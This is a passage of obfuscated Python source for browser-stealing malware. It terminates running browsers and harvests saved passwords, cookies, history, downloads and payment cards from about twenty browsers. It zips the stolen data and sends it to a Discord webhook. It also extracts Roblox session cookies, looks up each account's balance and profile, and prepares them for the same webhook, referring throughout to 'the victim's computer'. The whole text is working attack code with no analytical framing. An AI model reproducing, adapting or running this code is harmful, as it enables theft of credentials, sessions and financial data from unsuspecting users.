            files_in_memory[f"History_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.txt"] = '\n'.join(IQGUBVTGYZZZOMXSOVNQDFIECGAUBDPUSKIVNUILVDHTNTBYPWDLOHLJSRKGRGUQCYCWSDASMAJCLBX)

        if XJLYBQBZANIVQJQTVWTGQFIBMNITYNHQGFKVDCWBWJDPURXWNPJQPGOQBNRCXDZW:
            files_in_memory[f"Downloads_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.txt"] = '\n'.join(XJLYBQBZANIVQJQTVWTGQFIBMNITYNHQGFKVDCWBWJDPURXWNPJQPGOQBNRCXDZW)

        if YFKNHMBCDRAIOKOPJWVEGSYLUPPMYCKTJOIHYKQOVORITZPWVYMBLXVYBLHXDI:
            files_in_memory[f"Cards_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.txt"] = '\n'.join(YFKNHMBCDRAIOKOPJWVEGSYLUPPMYCKTJOIHYKQOVORITZPWVYMBLXVYBLHXDI)

        zip_in_memory = io.BytesIO()
        with zipfile.ZipFile(zip_in_memory, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename, file_content in files_in_memory.items():
                zipf.writestr(filename, file_content)
        
        zip_in_memory.seek(0)
        return zip_in_memory

    def FZWSVPABVSEDOBZWKRRVWHYECIRZCPVSMCDQQUXAEVTZGSKIXWCNYEAHVMFIHYORKI(ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE, zip_in_memory):
        JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY = SyncWebhook.from_url(IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY)
        JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY.send(
            embed=Embed(
                title=f'Browser Steal {JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB}:',
                description=f"Found In **{'**, **'.join(WAIOVQDJYASOQYKEWPBZQUXCKJHPELVRJOADIROSCHTBARWHEHOI)}**: ```📂 - Browser_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.zip\n├── 📄 - Cards_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.txt\n├── 📄 - Cookies_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.txt\n├── 📄 - Downloads_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.txt\n├── 📄 - History_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.txt\n└── 📄 - Passwords_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.txt```",
                color=UTZBJCXIIXIRRNPGPVMVRAUQFHGPHNUXVZTCTFTBZDDPJAHSGQYQPDZEVSBBUHQHXDWLOFYAYJQXNWTPXQXX,
            ).set_footer(
                text=KYTKOBRBQHILSBXLLMVIIDOTMYLCMSODXPFYUYELALJDSKOABUSDKRXMDY,
                icon_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA
            ),
            file=File(fp=zip_in_memory, filename=f"Browser_{ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE}.zip"), 
            username=XDRDKLTFJIUFNEAZDALYFMCUQBIDKCEPGTOWNANQZULRCHMPYJVSYNO, avatar_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA
        )
        
    EGFWKQBAOKDBRKLRCNXCYOCYNKTHFNXGGZAVUROGLFAEQGKUJYASSBQYEGQTNMMZXDYFLAIELVDPSKEFXWRGSVANTWPCWEEQKTS = {
        'Google Chrome': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Google', 'Chrome', 'User Data'),
        'Microsoft Edge': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Microsoft', 'Edge', 'User Data'),
        'Opera': os.path.join(RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Vivaldi', 'User Data'),
        'Internet Explorer': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Microsoft', 'Internet Explorer'),
        'Amigo': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Amigo', 'User Data'),
        'Torch': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Torch', 'User Data'),
        'Kometa': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Kometa', 'User Data'),
        'Orbitum': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Orbitum', 'User Data'),
        'Cent Browser': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'CentBrowser', 'User Data'),
        '7Star': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, '7Star', '7Star', 'User Data'),
        'Sputnik': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Sputnik', 'Sputnik', 'User Data'),
        'Google Chrome SxS': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Google', 'Chrome SxS', 'User Data'),
        'Epic Privacy Browser': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Epic Privacy Browser', 'User Data'),
        'Uran': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'uCozMedia', 'Uran', 'User Data'),
        'Yandex': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Yandex', 'YandexBrowser', 'User Data'),
        'Iridium': os.path.join(VMYHFUUWJBMPFQPVATFLERJUYGBVGHEHYLQZSYYTBBZOEPHRTLLYAPQDDAPESKXSHMFXJIIGOEJEO, 'Iridium', 'User Data'),
        'Mozilla Firefox': os.path.join(RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC, 'Mozilla', 'Firefox', 'Profiles'),
        'Safari': os.path.join(RKPJIYVMGIXSWMFARXACKDSVRWIAZRLVJOLJCZGUDDIVPONJJPWBDOMJPKPDLPROTOJBXCZLC, 'Apple Computer', 'Safari'),
    }

    EGFWKQBAOKDBRKLRCNXCYOCYNKTHFNXGGZAVUROGLFAEQGKUJYASSBQYEGQTNMMZXDYFLAIELVDPSKEFXWRGSVANTWPCWEEQKTS_Processes = {
        'Google Chrome': 'chrome.exe',
        'Microsoft Edge': 'msedge.exe',
        'Opera': 'opera.exe',
        'Opera GX': 'opera.exe',
        'Brave': 'brave.exe',
        'Vivaldi': 'vivaldi.exe',
        'Internet Explorer': 'iexplore.exe',
        'Amigo': 'amigo.exe',
        'Torch': 'torch.exe',
        'Kometa': 'kometa.exe',
        'Orbitum': 'orbitum.exe',
        'Cent Browser': 'centbrowser.exe',
        '7Star': '7star.exe',
        'Sputnik': 'sputnik.exe',
        'Google Chrome SxS': 'chrome.exe',
        'Epic Privacy Browser': 'epic.exe',
        'Uran': 'uran.exe',
        'Yandex': 'yandex.exe',
        'Iridium': 'iridium.exe',
        'Mozilla Firefox': 'firefox.exe',
        'Safari': 'safari.exe',
    }
        
    JCWIAFOJSLPHRKMMCBKJZMDUEYJUYOJPWJYDQEACMICVRNADYQYQUNBPHCCXKDYTNQFUGPGYXSJZJOLVDYGUL = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    try:
        for browser, proc_name in EGFWKQBAOKDBRKLRCNXCYOCYNKTHFNXGGZAVUROGLFAEQGKUJYASSBQYEGQTNMMZXDYFLAIELVDPSKEFXWRGSVANTWPCWEEQKTS_Processes.items():
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.name().lower() == proc_name.lower():
                        proc.terminate()
                except: pass
    except: pass

    for KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG in EGFWKQBAOKDBRKLRCNXCYOCYNKTHFNXGGZAVUROGLFAEQGKUJYASSBQYEGQTNMMZXDYFLAIELVDPSKEFXWRGSVANTWPCWEEQKTS.items():
        if not os.path.exists(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG):
            continue

        WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY = HURBTAYTSDEFJYYWXRIPCZDAFHUUVPWRWWCJBUMWDNCRQXPNWMWRLBOSNDVOPJWNCFVQLABADMZJROMTNNHSZIBFKWYAM(os.path.join(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG, 'Local State'))
        if not WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY:
            continue

        for v4r_profile in JCWIAFOJSLPHRKMMCBKJZMDUEYJUYOJPWJYDQEACMICVRNADYQYQUNBPHCCXKDYTNQFUGPGYXSJZJOLVDYGUL:
            YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA = os.path.join(KJGLXEPRKOOZRIECICRDMADHRLECZLMAHPNEKBXLGQHFFQBGBSNVJYDOG, v4r_profile)
            if not os.path.exists(YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA):
                continue
            
            try: AJJOLZWYSNJHEAQCCJJVLERXIRWAKBXUWZMYFOWFIBLUSOJZQNEYNHQWWYKLDAXBY(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY)
            except: pass
            try: XIMOWEGQYTFCJNOXCKOUSVDNGFFGNTGHMJGIJBLHWOGHVWDVMMMSAYQWRUWUDVYBPUVXRKVLUVJQPWZNNLPXLSEJNFNT(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY)
            except: pass
            try: WEOIYCFAKDCYZIDFPZXSMHVPPUAVHFYWRDFXOJWSDDKEECHXZDXDWGZZLKLIQOILUYOQIDISJG(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA)
            except: pass
            try: KBUASBCVYHJJAANMFKTJDDMLTVGYGXBSCLFQUQVLMJNQZDZUBXVWNTRIFBYJYZPYTWIUIXXWHKTKNWVK(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA)
            except: pass
            try: OZHMOYVGRETSRWBSIEKDAZBXRRPPWYPWMCOCXXEQONIQUAQSZJIXBRKDT(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE, YQHKZPEVQCSKBZLGZQGAZYAMIZPEKZRAJQIQSXDGSTRKZKKPFEEXXMCZDQCFEZAXGZKURRSTESRA, WKYPIZDHNEXLEKNVCQNKBXJQIABPNDJOSBKVTNBMUXYMYNPXXHITCFIDYDY)
            except: pass

            if KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE not in WAIOVQDJYASOQYKEWPBZQUXCKJHPELVRJOADIROSCHTBARWHEHOI:
                WAIOVQDJYASOQYKEWPBZQUXCKJHPELVRJOADIROSCHTBARWHEHOI.append(KCRVUVLHIMIBCDMKUHUUDMDFIABKFPXDBYJUNXOOFJNNOSWJIDHABKHIMCETHHXOUE)
            
    if not ELBTUPFGZSDCXXGQDXCLQMGULXXJOXTHOSKAGHKWODBQTMOIMKCFUFJAAJPDKDWJPRFOUTQPSTORXPLOMMNJ:
        ELBTUPFGZSDCXXGQDXCLQMGULXXJOXTHOSKAGHKWODBQTMOIMKCFUFJAAJPDKDWJPRFOUTQPSTORXPLOMMNJ.append("No passwords was saved on the victim's computer")
    if not CDPUMIURYOEBQNYXYCBQZEGEKRWSDFPDMDCZPZRDHRDVYFMJEZKZVVYGJWARVRMAYJEW:
        CDPUMIURYOEBQNYXYCBQZEGEKRWSDFPDMDCZPZRDHRDVYFMJEZKZVVYGJWARVRMAYJEW.append("No cookies was saved on the victim's computer")
    if not IQGUBVTGYZZZOMXSOVNQDFIECGAUBDPUSKIVNUILVDHTNTBYPWDLOHLJSRKGRGUQCYCWSDASMAJCLBX:
        IQGUBVTGYZZZOMXSOVNQDFIECGAUBDPUSKIVNUILVDHTNTBYPWDLOHLJSRKGRGUQCYCWSDASMAJCLBX.append("No history was saved on the victim's computer")
    if not XJLYBQBZANIVQJQTVWTGQFIBMNITYNHQGFKVDCWBWJDPURXWNPJQPGOQBNRCXDZW:
        XJLYBQBZANIVQJQTVWTGQFIBMNITYNHQGFKVDCWBWJDPURXWNPJQPGOQBNRCXDZW.append("No downloads was saved on the victim's computer")
    if not YFKNHMBCDRAIOKOPJWVEGSYLUPPMYCKTJOIHYKQOVORITZPWVYMBLXVYBLHXDI:
        YFKNHMBCDRAIOKOPJWVEGSYLUPPMYCKTJOIHYKQOVORITZPWVYMBLXVYBLHXDI.append("No card was saved on the victim's computer")

    zip_in_memory = WKJCOWYIAIESBTXBGIUXPFAGEXPSWWQTLZOTZHLGOSWMMHKHXFNFGNMXNXEBBMPLWFBAROJYMAWVOYAYEJBLCLGGRMSCTXOLRYKU(ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE)
    FZWSVPABVSEDOBZWKRRVWHYECIRZCPVSMCDQQUXAEVTZGSKIXWCNYEAHVMFIHYORKI(ZBSIBLVWHVLBXIDAYZCEVHEIJYDDUVTXSOQGUTIKDAGKATYQDSDFUKEWMAGLRNGODNVFJDDOMXSMGXEANLKKWDGE, zip_in_memory)

def NYMQIBNVHPPQJQEOCABEIBKTAWZCCZSSOIVTSENDYFDUZLIXISNKCANGRPYCBGDHWIJDXHAFFWWCUCFWVFARLZNWPJCWPSXIWUPU():
    import browser_cookie3
    import requests
    import json
    from discord import SyncWebhook
    import discord

    JSMSTCBNGWHUITUGBKVDLXLTRVYJZYAPZMUXDWHZATRMRSNYITFOSEDEICCWABWLAJIVTPQKVPVVBDDAOWLPD = []
    def IHKVLRUTXQVLJVOTYFOVTEHZBTNGYVYHQNVQHYZOIDUDWQQBFQYTCBEQNLMJCVSPAOETNBRPVGWGFEGXGALHGJQMWPIHTHEAWP(WQOWQSVLOQDHFMPRQREVACOCEUGBONOBEVCZPKNXPOMVLRTAWVXMTSKKZKCKVCMDDBEBSICSMW):
        try:
            VAVOTAUZPKVGAUXBGLBVKZBKGLDIUVSUTYUKENBQGPTSJGACZHXTQCCXYVCLPWSUQKEUSUUFGMPLKESLZRMOT = WQOWQSVLOQDHFMPRQREVACOCEUGBONOBEVCZPKNXPOMVLRTAWVXMTSKKZKCKVCMDDBEBSICSMW()
            VAVOTAUZPKVGAUXBGLBVKZBKGLDIUVSUTYUKENBQGPTSJGACZHXTQCCXYVCLPWSUQKEUSUUFGMPLKESLZRMOT = str(VAVOTAUZPKVGAUXBGLBVKZBKGLDIUVSUTYUKENBQGPTSJGACZHXTQCCXYVCLPWSUQKEUSUUFGMPLKESLZRMOT)
            CPBLCKDAYAEOIZYNKFLPMDRFIKLLMWVZIHFKAYUUGUWJFZLCWXTQICLVCRDTWWQUHCYB = VAVOTAUZPKVGAUXBGLBVKZBKGLDIUVSUTYUKENBQGPTSJGACZHXTQCCXYVCLPWSUQKEUSUUFGMPLKESLZRMOT.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            IDXPCZGGWCBLCVBJPIQFOJHHYJNZFNWLFMYZYQJYZXCTRGZHMDRLWEEUV = WQOWQSVLOQDHFMPRQREVACOCEUGBONOBEVCZPKNXPOMVLRTAWVXMTSKKZKCKVCMDDBEBSICSMW.__name__
            return CPBLCKDAYAEOIZYNKFLPMDRFIKLLMWVZIHFKAYUUGUWJFZLCWXTQICLVCRDTWWQUHCYB, IDXPCZGGWCBLCVBJPIQFOJHHYJNZFNWLFMYZYQJYZXCTRGZHMDRLWEEUV
        except:
            return None, None

    def KISKXOYKDFHFSGGGWTSZYYKVTJNKLUNWAYTVMLSYUKASSOGVMKMHHNNWZNXTIFVTYNNHNDGHHCYUNHBDCOWJAQIVZSZOLF():
        return browser_cookie3.edge(domain_name="roblox.com")

    def WMXKVHQLTRWNOJNRBCAMGEQGVSTDZBXYIBMLRDSNTVOQGSHZIWSUNHFVWNUSM():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def NSJFEWAUUQVVETJIISEVAOJCRFWFNFHFAJKIGTXFIXGFKISTVRLQUJIKMLJQGNZYDZSZDSUQORQ():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def ZGIEWVMSPKBZUVQKEQKJDPWCYWZVVQYCNDMHVFMMHTHTNSWNXLSWZ():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def ZGIEWVMSPKBZUVQKEQKJDPWCYWZVVQYCNDMHVFMMHTHTNSWNXLSWZGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def DHGAHWRZJQLBSMLKOYRLMUKMMZOCGQEMPTDLTZXOHWXSQIUCKLKZUEQTPQBUB():
        return browser_cookie3.safari(domain_name="roblox.com")

    def KDWBUYQWCFELRRPMHJYYGDEUKVPTOVWDPMRSJNGYEZSZBPMDYAPATIDDEJGGFDODYQXXJRNYIPOJLLQJH():
        return browser_cookie3.brave(domain_name="roblox.com")

    SCHZMZONPYTZCGMVNHILESHZZQSINORBXFAITRCVNRJOVFJFNRHIYNTQXRPKQPWAOEORL = [KISKXOYKDFHFSGGGWTSZYYKVTJNKLUNWAYTVMLSYUKASSOGVMKMHHNNWZNXTIFVTYNNHNDGHHCYUNHBDCOWJAQIVZSZOLF, WMXKVHQLTRWNOJNRBCAMGEQGVSTDZBXYIBMLRDSNTVOQGSHZIWSUNHFVWNUSM, NSJFEWAUUQVVETJIISEVAOJCRFWFNFHFAJKIGTXFIXGFKISTVRLQUJIKMLJQGNZYDZSZDSUQORQ, ZGIEWVMSPKBZUVQKEQKJDPWCYWZVVQYCNDMHVFMMHTHTNSWNXLSWZ, ZGIEWVMSPKBZUVQKEQKJDPWCYWZVVQYCNDMHVFMMHTHTNSWNXLSWZGX, DHGAHWRZJQLBSMLKOYRLMUKMMZOCGQEMPTDLTZXOHWXSQIUCKLKZUEQTPQBUB, KDWBUYQWCFELRRPMHJYYGDEUKVPTOVWDPMRSJNGYEZSZBPMDYAPATIDDEJGGFDODYQXXJRNYIPOJLLQJH]
    for v4r_br0ws3r in SCHZMZONPYTZCGMVNHILESHZZQSINORBXFAITRCVNRJOVFJFNRHIYNTQXRPKQPWAOEORL:
        v4r_c00ki3, IDXPCZGGWCBLCVBJPIQFOJHHYJNZFNWLFMYZYQJYZXCTRGZHMDRLWEEUV = IHKVLRUTXQVLJVOTYFOVTEHZBTNGYVYHQNVQHYZOIDUDWQQBFQYTCBEQNLMJCVSPAOETNBRPVGWGFEGXGALHGJQMWPIHTHEAWP(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in JSMSTCBNGWHUITUGBKVDLXLTRVYJZYAPZMUXDWHZATRMRSNYITFOSEDEICCWABWLAJIVTPQKVPVVBDDAOWLPD:
                JSMSTCBNGWHUITUGBKVDLXLTRVYJZYAPZMUXDWHZATRMRSNYITFOSEDEICCWABWLAJIVTPQKVPVVBDDAOWLPD.append(v4r_c00ki3)
                try:
                    SMRIWBJHOMPEUDFYEKQFJEULJNSZEBTHCNCBSNFZSUVRSIRRIAQOKFIPLNBKXKXDHWAUDMMAYVINIONDPCMLUAYFGAYGURM = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT = json.loads(SMRIWBJHOMPEUDFYEKQFJEULJNSZEBTHCNCBSNFZSUVRSIRRIAQOKFIPLNBKXKXDHWAUDMMAYVINIONDPCMLUAYFGAYGURM.text)
                except:
                    pass

                UPGSLTWBSTQDHPCQFSHIFMEIJEHROQGTRIPVBJVHUHHHLWFIKLKDTUCBUGTEN = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('id', "None")
                IVOGOZZGOYYILIXVGOHLMDFZMPGFUKNQHIDXGZDCMTGLMKLVFOQAXCQOAWTDRYCXWJAYQAWGTVCHPBQEFTGDYPRQ = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('displayName', "None")
                KIWPQSLEAENSGSIMDMRMWCFPOYJESFWILJUQXOMDXOVTJHJYLLBKBAYBSWPKWHGQB = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get('name', "None")
                QVMLQZZSGCHKTGIVNEPFQPEHOWRFMKARVZEUBGWRBTCWCFEZYOPYZYZDHNPOAKMQNFLHFLVCQDKEPIFKMCVJUQ = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get("RobuxBalance", "None")
                ASKAPNXSLQRPFUIYNUXFILHFULYCDQGBLSLOPEFXMIYQRTTPAMDEKMSUOGMDAYOWDCRUFTXIUC = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get("IsPremium", "None")
                MPOAEGMVKFGOZRMVOQYICWPGWABNARDFVILZKJDJJBZSMUJTUQUEERI = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get("ThumbnailUrl", "None")
                VZJDMKEFOOGFCUKZKWFZWNMDTRUXFSUVVYKDIWFIRCLCLROBZPHFVHLJQYVDHHGPGUGKQYGKMHF = RQTMFBLFMPCESHPEYTCVNNPPISRBSDTSQIIOKFMCPRJOSYNOVKBCCXHMNTFOYZTBJJKQT.get("IsAnyBuildersClubMember", "None")
        
                FCIMIHITRPCBDTQYQTBNWMGYDDNOJVKHDNSVIOQYABRAKPSPMZNKKMJWUKOSRSYGIOQWGVUCBMUHGETWDVUWAAOPZYM = len(v4r_c00ki3)
                PUEHASFSBWFLFUYWTEXRDTJWGLDWWLBDVXVQWQQPARHOQOZTNVRYLVSTLEWONEHPE = FCIMIHITRPCBDTQYQTBNWMGYDDNOJVKHDNSVIOQYABRAKPSPMZNKKMJWUKOSRSYGIOQWGVUCBMUHGETWDVUWAAOPZYM // 2
                MKJXYBQJBJEWSOVCANHXIEAVMQODEDLPVBSIEXPDIIBVHXFWKCNXARULQDSGVTAQ = v4r_c00ki3[:PUEHASFSBWFLFUYWTEXRDTJWGLDWWLBDVXVQWQQPARHOQOZTNVRYLVSTLEWONEHPE]
                KHZPQDNCRQUSQGDDPOEVNCOUEHPUERVYBPFIDSSZXGDLYVDWAFBUWPJWUNAP = v4r_c00ki3[PUEHASFSBWFLFUYWTEXRDTJWGLDWWLBDVXVQWQQPARHOQOZTNVRYLVSTLEWONEHPE:]

                JWVLJMCFQSTQUEOJCKJMLOUKYFDWBBBBVFVMVAEYUGEVBMMGAFOXGPADLVGDXVY = SyncWebhook.from_url(IKQJVVFSHLEVTIPUFUKVLCQIRXYTVXMMJAWKINBAVESQEBGWQEOTJDXTY)

                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV = discord.Embed(
                    title=f'Roblox Cookie {JHLULHJAEVOGMHLPODOFLTMZEVLWMTKSCFIIIYITMFTBTRBCDAEKUGAIRGRUUXB}:',
                    color=UTZBJCXIIXIRRNPGPVMVRAUQFHGPHNUXVZTCTFTBZDDPJAHSGQYQPDZEVSBBUHQHXDWLOFYAYJQXNWTPXQXX
                )
                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.set_footer(text=KYTKOBRBQHILSBXLLMVIIDOTMYLCMSODXPFYUYELALJDSKOABUSDKRXMDY, icon_url=PEZQXUBYYISJCSLRGSXEGSSOZJFMGNIFHLGUNMFTLGZYHBPULYXXMUEMKBAMMEXZHMLLMA)
                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.set_thumbnail(url=MPOAEGMVKFGOZRMVOQYICWPGWABNARDFVILZKJDJJBZSMUJTUQUEERI)
                BOJTHLLCEBEOUYACAWHVQSOPWZXKNVUZVCFMBEVJNRCICJNUJKDFYJVRPGIBOSVBXQLV.add_field(name=":compass: Navigator:", value=f"```{IDXPCZGGWCBLCVBJPIQFOJHHYJNZFNWLFMYZYQJYZXCTRGZHMDRLWEEUV}```", inline=True)
